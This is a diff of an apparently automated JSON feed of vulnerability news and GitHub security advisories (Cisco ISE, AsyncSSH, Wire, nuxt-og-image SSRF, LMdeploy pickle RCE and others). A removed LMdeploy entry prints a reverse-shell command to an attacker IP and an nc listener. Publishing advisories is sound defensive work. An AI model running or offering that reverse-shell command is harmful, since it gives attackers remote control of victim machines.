@@ -1,8 +1,8 @@
 {
-  "generated": "2026-09-17T10:34:06.181119+00:00",
-  "total": 26,
+  "generated": "2026-09-17T15:46:53.138943+00:00",
+  "total": 25,
   "kev": 0,
-  "zero_day": 15,
+  "zero_day": 13,
   "enriched": 0,
   "findings": [
     {
@@ -37,6 +37,21 @@
       "is_high_severity": true
     },
     {
+      "id": "https://thehackernews.com/2026/09/china-aligned-famoussparrow-deploys.html",
+      "title": "China-Aligned FamousSparrow Deploys SparroWocky Backdoor Across Latin America",
+      "summary": "The China-aligned state-sponsored threat actor known as FamousSparrow has been observed deploying a previously unreported backdoor called SparroWocky in attacks targeting multiple countries in Latin America since at least August 2025.\n\n\"SparroWocky is a modular, C++ backdoor,\" ESET security researchers Alexandre C\u00f4t\u00e9 Cyr and Romain Dumont said in a technical report shared with The Hacker News",
+      "link": "https://thehackernews.com/2026/09/china-aligned-famoussparrow-deploys.html",
+      "published": "2026-09-17T10:05:45+00:00",
+      "source": "The Hacker News Security",
+      "tags": [
+        "news",
+        "zeroday"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
       "id": "CVE-2026-63127",
       "title": "RMCP: Missing Resource Field Validation in OAuth Protected Resource Metadata Discovery",
       "summary": "### Summary\nThe `rmcp` library does not validate the `resource` parameter in OAuth Protected Resource metadata (RFC 9728), allowing a malicious MCP server to redirect OAuth flows to a legitimate authorization server and steal the resulting access tokens.\n\n### Details\nRFC 9728 specifies two MUST requirements for resource parameter validation:\n- Section 7.3: the client MUST ensure that the resource identifier URL it is using as the prefix for the metadata request exactly matches the `resource` value in the returned metadata document.\n- Section 3.3: if the `resource` value returned is not identical to the URL the client used, the data MUST NOT be used.\n\nIn the current implementation (`crates/rmcp/src/transport/auth.rs`), the `ResourceServerMetadata` struct (lines 390\u2013394) does not include a resource field:\n```rust\nstruct ResourceServerMetadata {\n    authorization_server: Option<String>,\n    authorization_servers: Option<Vec<String>>,\n    scopes_supported: Option<Vec<String>>,\n}\n```\nAnd discover_oauth_server_via_resource_metadata() (lines 1446\u20131465) proceeds without any resource URL validation.\n\n#### Recommended fix\n1. Add the `resource` field to the struct:\n    ```rust\n    struct ResourceServerMetadata {\n        resource: Option<String>,  // RFC 9728 REQUIRED field\n        authorization_server: Option<String>,\n        authorization_servers: Option<Vec<String>>,\n        scopes_supported: Option<Vec<String>>,\n    }\n    ```\n2. Add validation logic after fetching metadata:\n    ```rust\n    let Some(resource_metadata) = self\n        .fetch_resource_metadata_from_url(&resource_metadata_url)\n        .await?\n    else {\n        return Ok(None);\n    };\n \n    // RFC 9728: validate that the resource identifier matches our target server\n    if let Some(resource) = &resource_metadata.resource {\n        if resource.trim_end_matches('/') != self.base_url.as_str().trim_end_matches('/') {\n            return Err(AuthError::MetadataError(format!(\n                \"Resource metadata mismatch",
@@ -50,70 +65,6 @@
       ],
       "cve_ids": [
         "CVE-2026-63127"
-      ],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://www.securityweek.com/aiuc-raises-40-million-to-certify-enterprise-ai-agents/",
-      "title": "AIUC Raises $40 Million to Certify Enterprise AI Agents",
-      "summary": "The company provides a standard for AI systems, testing them against risks such as jailbreaks, prompt injections, and unauthorized actions. The post AIUC Raises $40 Million to Certify Enterprise AI Agents appeared first on SecurityWeek .",
-      "link": "https://www.securityweek.com/aiuc-raises-40-million-to-certify-enterprise-ai-agents/",
-      "published": "2026-09-16T13:38:36+00:00",
-      "source": "SecurityWeek",
-      "tags": [
-        "news",
-        "research"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://thehackernews.com/2026/09/google-patches-pixel-modem-flaw-amid.html",
-      "title": "Google Patches Pixel Modem Flaw Amid Signs of Limited Targeted Exploitation",
-      "summary": "Google has disclosed that a high-severity security flaw in its Pixel Cellular Modem has come under exploitation in the wild.\n\nThe vulnerability, tracked as CVE-2026-58704 (CVSS score: 8.0), is a privilege escalation flaw.\n\n\"In Cellular Modem, there is a possible permission bypass due to a logic error in the code,\" according to a description of the bug in the NIST National Vulnerability Database",
-      "link": "https://thehackernews.com/2026/09/google-patches-pixel-modem-flaw-amid.html",
-      "published": "2026-09-16T11:15:58+00:00",
-      "source": "The Hacker News Security",
-      "tags": [
-        "news",
-        "zeroday"
-      ],
-      "cve_ids": [
-        "CVE-2026-58704"
-      ],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://www.bleepingcomputer.com/news/security/cisa-warns-of-hackers-exploiting-critical-screenconnect-flaw/",
-      "title": "Critical ScreenConnect flaw now actively exploited in attacks",
-      "summary": "Attackers now exploit\u00a0a critical-severity ConnectWise ScreenConnect vulnerability in the wild, according to the U.S. Cybersecurity and Infrastructure Security Agency (CISA). [...]",
-      "link": "https://www.bleepingcomputer.com/news/security/cisa-warns-of-hackers-exploiting-critical-screenconnect-flaw/",
-      "published": "2026-09-16T11:14:28+00:00",
-      "source": "Bleeping Computer",
-      "tags": [
-        "news",
-        "malware"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://thehackernews.com/2026/09/acronis-cpanel-backup-plugin.html",
-      "title": "Acronis cPanel Backup Plugin Vulnerability Exploited in Targeted Attacks",
-      "summary": "Acronis has warned that a high-severity security flaw in its Backup plugin for cPanel and Web Host Manager (WHM) deployments has been exploited in the wild.\n\nThe vulnerability, tracked as CVE-2026-87886 (CVSS score: 7.8), is described as a case of local privilege escalation due to insecure file permissions. It affects the following versions -\n\n\n  Acronis Backup plugin for cPanel & WHM (Linux",
-      "link": "https://thehackernews.com/2026/09/acronis-cpanel-backup-plugin.html",
-      "published": "2026-09-16T11:08:54+00:00",
-      "source": "The Hacker News Security",
-      "tags": [
-        "news",
-        "zeroday"
-      ],
-      "cve_ids": [
-        "CVE-2026-87886"
       ],
       "is_zero_day": true,
       "is_high_severity": true
@@ -231,6 +182,23 @@
       "is_high_severity": false
     },
     {
+      "id": "https://thehackernews.com/2026/09/cisco-warns-of-new-zero-day-ise-auth.html",
+      "title": "Cisco Warns of New Zero-Day ISE Auth Bypass (CVSS 10.0) Exploited in Active Attacks",
+      "summary": "Cisco has warned of a fresh maximum-severity security flaw impacting Identity Services Engine (ISE) that has come under active exploitation.\n\nThe vulnerability, tracked as CVE-2026-76460 (CVSS score: 10.0), could allow an unauthenticated, remote attacker to bypass authentication.\n\n\"This vulnerability is due to insufficient authentication control on an API endpoint,\" Cisco said. \"An attacker",
+      "link": "https://thehackernews.com/2026/09/cisco-warns-of-new-zero-day-ise-auth.html",
+      "published": "2026-09-17T06:39:40+00:00",
+      "source": "The Hacker News Security",
+      "tags": [
+        "news",
+        "zeroday"
+      ],
+      "cve_ids": [
+        "CVE-2026-76460"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
       "id": "https://www.securityweek.com/active-exploitation-triggers-emergency-patch-for-cisco-ise-zero-day/",
       "title": "Active Exploitation Triggers Emergency Patch for Cisco ISE Zero-Day",
       "summary": "Remote, unauthenticated attackers can exploit the vulnerability to bypass authentication via crafted requests. The post Active Exploitation Triggers Emergency Patch for Cisco ISE Zero-Day appeared first on SecurityWeek .",
@@ -244,6 +212,95 @@
       "cve_ids": [],
       "is_zero_day": true,
       "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-62949",
+      "title": "AsyncSSH: asyncio event-loop freeze via SSH maximum packet size = 0 in SSH_MSG_CHANNEL_OPEN / OPEN_CONFIRMATION",
+      "summary": "## Summary\n\nA malicious SSH server can wedge an AsyncSSH **client**, and an authenticated\nclient can wedge an AsyncSSH **server**, by sending a channel `maximum packet\nsize` of `0` in `SSH_MSG_CHANNEL_OPEN_CONFIRMATION` (server\u2192client) or\n`SSH_MSG_CHANNEL_OPEN` (client\u2192server). AsyncSSH stores the peer-supplied value\nverbatim with no lower-bound check; the first time channel data is written,\n`SSHChannel._flush_send_buf` enters a **synchronous infinite loop** that cannot\nbe interrupted by `asyncio.wait_for` or any timeout. The loop body has no\n`await`, so it blocks the entire asyncio event loop \u2014 for a server, one\nmalicious authenticated channel freezes **all** current and future connections.\n\nRFC 4254 \u00a75.1 leaves receiver behavior for a peer-reported \"maximum packet\nsize = 0\" undefined, so the value must be rejected rather than stored.\n\n## Root cause\n\n`asyncssh/channel.py`:\n\n```python\n# process_open (server side)        -- line 465\nself._send_pktsize = send_pktsize    # peer value, no >= 1 check\n\n# process_open_confirmation (client) -- line 528\nself._send_pktsize = send_pktsize    # peer value, no >= 1 check\n\n# _flush_send_buf                    -- lines 305-320\nwhile self._send_buf and self._send_window:\n    pktsize = min(self._send_window, self._send_pktsize)  # 0 when peer sends 0\n    buf, datatype = self._send_buf[0]\n    if len(buf) > pktsize:          # True for any buffered data\n        data = buf[:pktsize]        # empty (b'')\n        del buf[:pktsize]           # no-op\n    ...\n    self._send_window -= len(data)  # -= 0, unchanged\n```\n\nWith `_send_pktsize == 0`, `pktsize` is `0`, so `buf[:0]` is empty,\n`del buf[:0]` is a no-op, and `_send_window` is never decremented \u2014 the\n`while` condition is permanently true, and with no `await` in the body the\nevent loop is blocked.\n\n## Impact\n\n- **Client vector (primary):** a malicious SSH server replies to the client's\n  channel open with `maximum packet size = 0`; the client wedges on its first\n  channel write. The atta",
+      "link": "https://github.com/advisories/GHSA-rw4j-r22c-9gc3",
+      "published": "2026-09-17T14:53:01Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-62949"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-63126",
+      "title": "Wire: Unauthenticated decoder crash via 32-bit length integer overflow in ByteArrayProtoReader32 (incomplete fix of CVE-2026-45799)",
+      "summary": "Wire's protobuf decoders did not consistently validate attacker-controlled length-delimited sizes against the current reader bounds before computing cursor, limit, or pointer positions.\n\nIn the Kotlin runtime, `ProtoAdapter.decode(ByteArray)` and `ProtoAdapter.decode(ByteString)` use the `ProtoReader32` fast path implemented by `ByteArrayProtoReader32`. In `ByteArrayProtoReader32.internalNextLengthDelimited()`, Wire read an untrusted varint length into an `Int` and rejected only negative values. A length such as `2147483647` is non-negative, so it passed that check, but `pos + length` overflowed the signed 32-bit cursor and produced a negative `limit`. The following `if (limit > pushedLimit)` guard did not catch this because the overflowed value was negative.\n\nThat invalid limit then reached string, bytes, skip, and scalar-reading paths as an invalid byte count or invalid range. Instead of failing as a checked decode error such as `IOException`, malformed input could throw unchecked runtime exceptions including `IllegalArgumentException` and `ArrayIndexOutOfBoundsException`. Applications commonly treat malformed protobuf input as an expected decode failure; unchecked runtime exceptions escaping that boundary can crash request handling or the process.\n\nThe original report is a sibling of the negative-length skipped-group bug fixed as CVE-2026-45799. It is not the same bug. The length in this advisory is positive, and the overflow occurs when setting a length-delimited message limit, not only when skipping a group.\n\nWhile auditing for the same bug class, related boundary flaws were also found and fixed:\n\n- Kotlin `ProtoReader` now validates logical message limits before varint, fixed32, fixed64, and skip operations. The originally reported byte-array overflow payload did not reproduce as the same signed overflow in `ProtoReader`, because that reader tracks positions as `Long`, but the streaming reader still needed consistent current-message-limit enforcement.\n- Swift ",
+      "link": "https://github.com/advisories/GHSA-9rm7-3qhh-h2mc",
+      "published": "2026-09-17T14:52:52Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-63126"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-71538",
+      "title": "@cyclonedx/cyclonedx-npm: Shell Injection via Unsanitized --workspace Argument on Windows",
+      "summary": "## Summary\n\nA **Windows-specific** command injection vulnerability exists in `@cyclonedx/cyclonedx-npm` when the CLI is invoked with the `--workspace <value>` option.  \nUser-supplied `--workspace` values can be passed to a shell command without proper neutralization on the Windows fallback execution path, enabling attackers to inject arbitrary OS commands.  \n\nThe vulnerability was fixed in version [6.0.0][v6.0.0].\n\n## Vulnerability Details\n\nWhen `cyclonedx-npm` is executed with the `--workspace` option, the provided argument is incorporated into an internal command execution flow.  \nOn **Windows systems**, this path can interpret untrusted `--workspace` input as shell syntax if not safely handled.\n\nAs a result, specially crafted workspace names can break out of the intended command context and execute arbitrary commands with the privileges of the invoking user.\n\n## Impact\n\nAn attacker who can influence the value passed to `--workspace` can execute arbitrary OS commands **on Windows hosts**.  \nThis may lead to:\n\n* Arbitrary command execution\n* Data exfiltration\n* Local privilege escalation (depending on runtime context and privileges)\n* Modification or destruction of files accessible to the user running the CLI\n\nThe vulnerability affects only scenarios where:\n\n* The user invokes `cyclonedx-npm` with `--workspace <value>`, and\n* The vulnerable execution path is reached on **Windows**.\n\n## Exploitation Conditions (High-Level)\n\nExploitation requires the attacker to supply or influence the `--workspace` value passed to the CLI.  \nIf the tool falls back to the vulnerable shell execution path on **Windows**, specially crafted workspace identifiers can cause unintended command execution.  \nNo exploit code is included here to avoid providing weaponizable examples.\n\n## Root Cause\n\nThe CLI fallback execution path on **Windows** constructed a shell command using untrusted input from the `--workspace` option.  \nBecause the fallback code path does not sanitize or escape the works",
+      "link": "https://github.com/advisories/GHSA-q69g-4hcv-6jg4",
+      "published": "2026-09-17T14:50:40Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-71538"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-61793",
+      "title": "Nuxt OG Image has unauthenticated SSRF via `fonts[].path` URL parameter",
+      "summary": "### Summary\n`nuxt-og-image` exposes an **unauthenticated HTTP endpoint** at `/_og/d/**` that base64url-decodes and `JSON.parse`s a `fonts` URL segment, then passes each `fonts[i].path` value directly into `fetch()` server-side **without any URL validation** (no scheme allowlist, no loopback/RFC1918 block, no host allowlist, no DNS rebinding mitigation).\n\nUnder the module's documented default configuration (`security.strict = false`, `security.secret = \"\"`, `restrictRuntimeImagesToOrigin = false`), any caller able to reach the deployed Nuxt site can force the Nuxt server to issue arbitrary outbound `GET` requests to any host reachable from the server - including loopback, RFC1918 LAN, and cloud metadata services (AWS IMDS, GCE/Azure metadata, Kubernetes `kubelet`, internal admin panels, Redis/etcd/Consul/Vault HTTP APIs).\n\nThe chain is **blind** (Satori consumes the response as font bytes and silently discards non-fonts) but a robust **side-channel** exists: the outer HTTP status is `500` when the SSRF target returns `2xx`, and `200` when it fails or returns non-`2xx`. This is sufficient to (a) enumerate live internal services and open ports, (b) confirm IMDSv1 reachability, and (c) detect credential issuance on environments still allowing IMDSv1.\n\nDemonstrated end-to-end on a stock `npm create nuxt@latest` install with the module's documented default usage.\n\n### Detail\n\n#### Endpoint registration (unauthenticated)\n\nThe module registers `/_og/d/**` and `/_og/s/**` with no authentication / Origin check / Sec\u2011Fetch\u2011Site validation:\n\n```js\n// dist/shared/nuxt-og-image.DdbTs-xp.mjs : 5113-5133\naddServerHandler({ route: \"/_og/d/**\", handler: resolve(\"./runtime/server/routes/image\") })\naddServerHandler({ route: \"/_og/s/**\", handler: resolve(\"./runtime/server/routes/image\") })\n```\n\n#### Default security config (permissive)\n\n```js\n// dist/shared/nuxt-og-image.DdbTs-xp.mjs : 5618-5640\nsecurity: {\n  strict:                       config.security?.strict ?? false,         // <- ",
+      "link": "https://github.com/advisories/GHSA-q8hw-4fvp-9rwv",
+      "published": "2026-09-17T14:48:55Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-61793"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://thehackernews.com/2026/09/critical-unbound-dnssec-validator-flaw.html",
+      "title": "Critical Unbound DNSSEC Validator Flaw Could Allow RCE via a Malicious DNS Zone",
+      "summary": "Every release of the Unbound DNS resolver before 1.26.1 has a critical heap overflow in its DNSSEC validator, maintainer NLnet Labs said in an\u00a0advisory\u00a0on Wednesday.\n\nAn attacker who controls a malicious zone and queries a vulnerable resolver can trigger it, enabling remote code execution.\n\nUnbound 1.26.1, released the same day, fixes the bug, tracked as\u00a0CVE-2026-81642, along with",
+      "link": "https://thehackernews.com/2026/09/critical-unbound-dnssec-validator-flaw.html",
+      "published": "2026-09-17T12:30:00+00:00",
+      "source": "The Hacker News Security",
+      "tags": [
+        "news",
+        "zeroday"
+      ],
+      "cve_ids": [
+        "CVE-2026-81642"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
     },
     {
       "id": "CVE-2026-63671",
@@ -348,78 +405,6 @@
       ],
       "cve_ids": [
         "CVE-2026-89026"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2025-59953",
-      "title": "LMdeploy has Remote Code Execution by Pickle Deserialization via zmq_rpc.call_and_response() in InterLM/lmdeploy",
-      "summary": "### Description\n\nThe LMdeploy\u00a0implements an\u00a0rpc server (AsyncRPCServer in zmq_rpc.py)\u00a0for supporting the RPC communications. In its core functionality\u00a0call_and_response(), I found it will directly use the\u00a0pickles.loads()\u00a0to deserialize the received messages without any sanitization, hence resulting in a remote code execution vulnerability by this RPC server.\n\n### Proof of Concept\n\n* Step1:\nThe victim user starts a RPC server that connects to its network interface. We give our example code (server.py) in the attachment, you can reproduce directly with server.py.\n\n* Step2:\nThe attacker can then send malicious pickle dump data to the remote RPC address for the attack. We give a example to show how can an attacker acquire a command shell:\n<img width=\"832\" height=\"324\" alt=\"image\" src=\"https://github.com/user-attachments/assets/03b9654d-e25b-4e93-903a-2aae8b12e704\" />\n\nIn this example, attacker modifies AsyncRPCClient and send a request containing malicious pickle dump data to let the victim execute command \u201cbash -c \u2018bash -i >& /dev/tcp/202.112.47.27/4444 0>&1\u2019\u201d, where 202.112.47.27 is an attacker\u2019s server. \nTwo points require special attention:\n1.The client code originally only connects to localhost over a socket, but an attacker can easily change localhost to another IP to perform remote exploitation, because the RPC server does not validate the connecting IP.\n2.The RPC server\u2019s port is randomized, but an attacker can still scan ports to find and exploit it; in our demo we explicitly set the target port.\n\n\n* Step3:\nAttacker can use nc tool (nc -l 4444) to create a reverse shell and wait for connection. Then, attacker runs the client to send the malicious request. Since the pickle deserialization vulnerability, the victim rpc server will execute the malicious command and consequently let attacker get the command shell of victim machine.\n\nWe also give a demo video in the attachment, along with modified zmq_rpc.py. When you reproduce this issue in the client side (as an a",
-      "link": "https://github.com/advisories/GHSA-5h8j-6crg-7rmw",
-      "published": "2026-09-16T15:34:27Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2025-59953"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-61595",
-      "title": "djust: Multi-tenant isolation fails open on the WebSocket/SSE path, disclosing other tenants' data",
-      "summary": "### Impact\n`djust.tenants` isolation was enforced only on the HTTP path. The current tenant was stored in `threading.local()` and set exclusively by the HTTP-only `TenantMiddleware`, so on the live (WebSocket/SSE) path `get_current_tenant()` was always `None` during mount and every event handler \u2014 and the tenant-aware `QuerySet` manager failed **OPEN** (returned the unfiltered queryset, ignoring `STRICT_MODE`), disclosing **every** tenant's rows to whoever held the socket. `threading.local` was additionally shared across connections on the `sync_to_async` executor thread.\n\n### Patches\nFixed in **djust 1.0.7**. Tenant storage moved to a `contextvars.ContextVar` (per async task); the resolved tenant is bound around WS/SSE mount and every dispatch; both managers scope the base queryset once and fail **CLOSED** (`.none()` under the default `STRICT_MODE`); and system check **S006** warns when `STRICT_MODE=False`.\n\n### Workarounds\nNo workaround on the live path short of upgrading.",
-      "link": "https://github.com/advisories/GHSA-3492-cvg7-9mr2",
-      "published": "2026-09-16T15:32:10Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-61595"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-61598",
-      "title": "djust: Client mass-assignment of arbitrary view attributes via the default dj-model update_model handler",
-      "summary": "### Impact\n`djust.mixins.model_binding.ModelBindingMixin` provides a default `update_model` event handler and is part of the **LiveView base MRO**, so every LiveView exposes it. It `setattr`s a view attribute whose **name is client-supplied** (`field`), gated only by: reject `_`-prefixed names; reject a **14-entry denylist** of framework internals (`FORBIDDEN_MODEL_FIELDS`); optional `allowed_model_fields` which **defaults to None = allow all**; and `hasattr` existence.\n\nResult: a client can set **any public, existing view attribute \u2014 not just the fields actually bound with `dj-model=` in the rendered template**. The denylist covers framework plumbing but nothing about developer business/authz state, and the allowlist is opt-in (off by default). A developer who binds one `dj-model=\"search\"` input and also keeps `self.account_id` / `self.is_admin` / `self.total_price` as view state does not realize a client can set ALL of them via `{type:event, event:\"update_model\", params:{field, value}}` over the WebSocket. Type coercion matches the target attribute's type (so `\"true\"` -> bool True), aiding the attacker.\n\n**Severity High** for apps that hold authorization/ownership/business state in public view attributes (the normal djust pattern) -> state tampering / IDOR / authz-flag manipulation; Low otherwise. Default-on across every LiveView. For a public (no-login) view an anonymous client can mass-assign; for an authenticated view a logged-in user can tamper their own session's view state (the IDOR/authz vector when downstream handlers act on it without re-authorizing).\n\nReproduced: a view with `account_id/is_admin/total_price` (none bound with dj-model) had all three set via `update_model` calls.\n\n### Patches\nRestrict the default handler to fields actually exposed via `dj-model=`: have the template renderer record the bound-field set per render and reject any `field` outside it (preferred, secure + zero-config); or make `allowed_model_fields` fail-closed (required). Keep `",
-      "link": "https://github.com/advisories/GHSA-cc7c-9jff-58wj",
-      "published": "2026-09-16T13:55:48Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-61598"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-81192",
-      "title": "OpenTelemetry.Resources.Host vulnerable to arbitrary code execution via local PATH hijacking on macOS",
-      "summary": "### Summary\n\nThe `OpenTelemetry.Resources.Host` NuGet package is affected by an untrusted search path vulnerability on macOS. The `host.id` resource attribute detector launches the `sh` and `ioreg` executables by bare name rather than by absolute path, so both are resolved\nthrough the `PATH` environment variable.\n\nA local attacker who is less privileged than the host application, and who can influence `PATH` or write to a directory that appears in `PATH` ahead of the system directories, can have an arbitrary binary executed in the application's security context, resulting in local\ncode execution/privilege escalation.\n\n### Details\n\nThe implementation of the host detector macOS has always invoked `ioreg` and `sh` via their bare names since it was implemented by [open-telemetry/opentelemetry-dotnet-contrib#1631](https://github.com/open-telemetry/opentelemetry-dotnet-contrib/pull/1631).\n\nThe vulnerability was fixed by [open-telemetry/opentelemetry-dotnet-contrib#4760](https://github.com/open-telemetry/opentelemetry-dotnet-contrib/pull/4760) which executes `ioreg` directly using its absolute path.\n\n### Impact\n\nApplications running on **macOS** that use the `OpenTelemetry.Resources.Host` detector when an attacker who is *less privileged* than the application process can influence `PATH` or write to a `PATH` directory that precedes the system directories (e.g. a higher-privileged service with a user-writable directory in its search path, or a process inheriting an attacker-influenced environment). The attacker gains code execution in the application's security context through an attacker-controlled `ioreg` executable.\n\n### Mitigation\n\nThis vulnerability only affect macOS hosts - Linux and Windows hosts are unaffected.\n\n### Workarounds\n\nNone known.\n\n### References\n\n- [GHSA-9h8m-3fm2-qjrq](https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-9h8m-3fm2-qjrq)\n- [open-telemetry/opentelemetry-dotnet-contrib#4760](https://github.com/open-telemetry/opentelem",
-      "link": "https://github.com/advisories/GHSA-v8pv-4842-x354",
-      "published": "2026-09-16T13:54:16Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-81192"
       ],
       "is_zero_day": false,
       "is_high_severity": true
